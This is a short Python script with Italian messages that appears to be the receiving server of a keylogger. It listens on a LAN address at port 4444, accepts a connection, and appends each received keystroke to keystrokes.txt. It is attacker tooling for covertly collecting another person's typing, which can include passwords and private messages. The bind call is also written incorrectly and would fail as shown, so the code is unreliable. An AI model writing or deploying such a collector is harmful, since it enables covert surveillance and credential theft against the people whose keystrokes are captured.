import socket
log = []
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind('192.168.1.14', 4444)
server.listen()
print("Server in ascolto su 192.168.1.14:4444")
connection, address = server.accept()
print(f"Connessione ricevuta da: {address}|{connection}")
while True:
    data = connection.recv(1024)
    if not data:
        break
    
    key = data.decode()
    log.append(key)
    
    with open("keystrokes.txt", "a") as file:
        file.write(key)
    
    print(f"Tasto salvato: {key}")
connection.close()
server.close()
print("Server terminato")